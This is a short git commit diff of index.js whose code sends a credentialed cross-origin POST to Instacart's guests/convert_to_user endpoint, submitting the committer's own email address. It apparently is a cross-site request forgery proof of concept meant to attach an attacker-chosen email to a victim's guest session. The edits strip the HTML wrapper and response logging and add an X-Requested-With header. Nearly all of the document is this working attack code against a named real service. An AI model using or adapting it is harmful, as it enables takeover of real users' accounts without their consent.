04c72399b015af07faba1c673368bf9c1d84f3c5
Green <green.epita2016@gmail.com>
2020-08-31 00:53:30 +0200

    go

--- index.js
+++ index.js
@@ -1,13 +1,6 @@
-<html>
-	<script>
-		var xhr = new XMLHttpRequest();
+var xhr = new XMLHttpRequest();
 xhr.open('POST', 'https://www.instacart.com/api/v2/guests/convert_to_user', true);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhr.onload = function () {
-	    console.log(this.responseText);
-};
+xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
 xhr.withCredentials = true;
 xhr.send('email=green.epita2016@gmail.com');
-
-</script>
-</html>
